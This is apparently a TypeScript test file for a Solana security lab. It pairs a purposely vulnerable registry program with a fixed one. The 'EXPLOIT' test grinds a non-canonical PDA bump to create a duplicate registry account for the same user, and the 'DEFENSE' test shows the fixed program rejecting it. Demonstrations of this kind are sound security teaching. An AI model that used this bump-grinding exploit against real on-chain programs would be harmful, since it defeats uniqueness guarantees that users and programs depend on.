import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { ed25519 } from "@noble/curves/ed25519.js";
import {
  generateKeyPairSigner,
  getProgramDerivedAddress,
  getAddressEncoder,
  getAddressDecoder,
  type Address,
} from "@solana/kit";
import {
  LiteSVM,
  TransactionMetadata,
  FailedTransactionMetadata,
  anchorDiscriminator,
  loadProgram,
  sendIx,
  lamports,
  SOL,
} from "./harness.js";

const D = "target/deploy";
const SYSTEM_PROGRAM = "11111111111111111111111111111111" as Address;
const addrEncoder = getAddressEncoder();
const addrDecoder = getAddressDecoder();
const REG = new TextEncoder().encode("reg");
const PDA_MARKER = new TextEncoder().encode("ProgramDerivedAddress");
const REGISTRY_SIZE = 33; // 32-byte user pubkey + 1-byte bump

// A fixed user pubkey keeps the non-canonical-bump search deterministic (only the
// seed must be fixed; payers stay random). It is used purely as a PDA seed, so its
// own curve membership is irrelevant.
const USER = addrDecoder.decode(
  new Uint8Array(Array.from({ length: 32 }, (_, i) => (i * 7 + 3) & 0xff)),
);

/** ed25519 on-curve test: a valid point decompresses; a PDA (off-curve) throws. */
function isOnCurve(point: Uint8Array): boolean {
  try {
    ed25519.Point.fromHex(Buffer.from(point).toString("hex"));
    return true;
  } catch {
    return false;
  }
}

/**
 * Solana create_program_address: sha256(seeds.. || programId || "ProgramDerivedAddress").
 * Returns the address bytes for a valid (off-curve) PDA, or null if the result lands
 * on the curve (an invalid bump, which the runtime would also reject).
 */
function createProgramAddress(seeds: Uint8Array[], programId: Uint8Array): Uint8Array | null {
  const h = createHash("sha256");
  for (const s of seeds) h.update(s);
  h.update(programId);
  h.update(PDA_MARKER);
  const out = new Uint8Array(h.digest());
  return isOnCurve(out) ? null : out;
}

/**
 * Derive the canonical PDA/bump (via kit) plus the highest NON-canonical (lower,
 * still off-curve) bump for seeds [b"reg", USER] under `program`. Self-verifies that
 * the manual create_program_address reproduces kit's canonical address.
 */
async function deriveBumps(program: Address) {
  const userBytes = new Uint8Array(addrEncoder.encode(USER));
  const programBytes = new Uint8Array(addrEncoder.encode(program));
  const [canonicalAddr, canonicalBump] = await getProgramDerivedAddress({
    programAddress: program,
    seeds: [REG, userBytes],
  });

  const reproduced = createProgramAddress([REG, userBytes, Uint8Array.of(canonicalBump)], programBytes);
  assert.ok(reproduced, "canonical bump must be off-curve");
  assert.strictEqual(
    addrDecoder.decode(reproduced),
    canonicalAddr,
    "manual create_program_address must reproduce kit's canonical PDA",
  );

  let ncBump = -1;
  let ncAddr: Address | undefined;
  for (let b = canonicalBump - 1; b >= 0; b--) {
    const out = createProgramAddress([REG, userBytes, Uint8Array.of(b)], programBytes);
    if (out) {
      ncBump = b;
      ncAddr = addrDecoder.decode(out);
      break;
    }
  }
  assert.ok(ncAddr !== undefined && ncBump >= 0, "expected a non-canonical off-curve bump to exist");
  return { canonicalAddr, canonicalBump, ncAddr, ncBump };
}

function registerData(bump?: number): Uint8Array {
  const disc = anchorDiscriminator("register");
  if (bump === undefined) return disc;
  const out = new Uint8Array(disc.length + 1);
  out.set(disc, 0);
  out[disc.length] = bump;
  return out;
}

function registerIx(program: Address, registry: Address, user: Address, payer: Address, bump?: number) {
  return {
    programAddress: program,
    accounts: [
      { address: registry, role: 1 /* WRITABLE (PDA, signed via seeds) */ },
      { address: user, role: 0 /* READONLY, only a seed */ },
      { address: payer, role: 3 /* WRITABLE_SIGNER */ },
      { address: SYSTEM_PROGRAM, role: 0 /* READONLY */ },
    ],
    data: registerData(bump),
  };
}

const logsOf = (r: TransactionMetadata | FailedTransactionMetadata) =>
  r instanceof FailedTransactionMetadata ? r.meta().logs().join("\n") : String(r);

test("EXPLOIT: a non-canonical bump mints a duplicate registry account for one user", async () => {
  const svm = new LiteSVM();
  const vuln = await loadProgram(
    svm,
    `${D}/registry_vulnerable-keypair.json`,
    `${D}/registry_vulnerable.so`,
  );
  const { canonicalAddr, canonicalBump, ncAddr, ncBump } = await deriveBumps(vuln);
  assert.notStrictEqual(canonicalAddr, ncAddr, "canonical and non-canonical bumps must yield different PDAs");

  const attacker = await generateKeyPairSigner();
  svm.airdrop(attacker.address, lamports(SOL));

  // (1) The legitimate one-per-user registration at the canonical bump.
  const r1 = await sendIx(svm, attacker, registerIx(vuln, canonicalAddr, USER, attacker.address, canonicalBump));
  assert.ok(r1 instanceof TransactionMetadata, `canonical register should succeed: ${logsOf(r1)}`);

  // (2) Same user, a NON-canonical bump -> a second, distinct account (the bug).
  const r2 = await sendIx(svm, attacker, registerIx(vuln, ncAddr, USER, attacker.address, ncBump));
  assert.ok(r2 instanceof TransactionMetadata, `non-canonical register should ALSO succeed (exploit lands): ${logsOf(r2)}`);

  // Both PDAs now hold an initialized, program-owned registry record for the SAME user.
  const userBytes = new Uint8Array(addrEncoder.encode(USER));
  for (const [addr, bump] of [[canonicalAddr, canonicalBump], [ncAddr, ncBump]] as const) {
    const acc = svm.getAccount(addr);
    assert.ok(acc?.exists, `registry account ${addr} should exist`);
    if (!acc.exists) throw new Error("unreachable");
    assert.strictEqual(acc.programAddress, vuln, `registry ${addr} should be owned by the program`);
    assert.strictEqual(acc.data.length, REGISTRY_SIZE, "registry record is 33 bytes");
    assert.deepStrictEqual(Uint8Array.from(acc.data.slice(0, 32)), userBytes, "record stores the same user");
    assert.strictEqual(acc.data[32], bump, "record stores the bump that was used");
  }
});

test("DEFENSE: the fixed program derives the canonical bump, so the duplicate cannot be created", async () => {
  const svm = new LiteSVM();
  const fixed = await loadProgram(
    svm,
    `${D}/registry_fixed-keypair.json`,
    `${D}/registry_fixed.so`,
  );
  const { canonicalAddr, ncAddr } = await deriveBumps(fixed);

  const attacker = await generateKeyPairSigner();
  svm.airdrop(attacker.address, lamports(SOL));

  // (1) The canonical registration succeeds (the one legitimate account).
  const r1 = await sendIx(svm, attacker, registerIx(fixed, canonicalAddr, USER, attacker.address));
  assert.ok(r1 instanceof TransactionMetadata, `canonical register should succeed: ${logsOf(r1)}`);

  // (2) The attacker tries to mint a duplicate at the non-canonical address. The fixed
  //     program derives the canonical PDA itself and rejects the mismatch (WrongRegistry).
  const r2 = await sendIx(svm, attacker, registerIx(fixed, ncAddr, USER, attacker.address));
  assert.ok(r2 instanceof FailedTransactionMetadata, "fixed program must reject the non-canonical registry address");
  assert.match(logsOf(r2), /WrongRegistry/, `expected WrongRegistry, got:\n${logsOf(r2)}`);
  assert.strictEqual(svm.getBalance(ncAddr), null, "no duplicate account exists at the non-canonical address");
});

test("POSITIVE CONTROL: a legitimate one-time registration succeeds under the fixed program", async () => {
  const svm = new LiteSVM();
  const fixed = await loadProgram(
    svm,
    `${D}/registry_fixed-keypair.json`,
    `${D}/registry_fixed.so`,
  );

  const user = await generateKeyPairSigner(); // a fresh, distinct user
  const attacker = await generateKeyPairSigner();
  svm.airdrop(attacker.address, lamports(SOL));
  const [registry] = await getProgramDerivedAddress({
    programAddress: fixed,
    seeds: [REG, new Uint8Array(addrEncoder.encode(user.address))],
  });

  const r = await sendIx(svm, attacker, registerIx(fixed, registry, user.address, attacker.address));
  assert.ok(r instanceof TransactionMetadata, `legit registration should succeed: ${logsOf(r)}`);
  assert.notStrictEqual(svm.getBalance(registry), null, "the registry account was created");
});
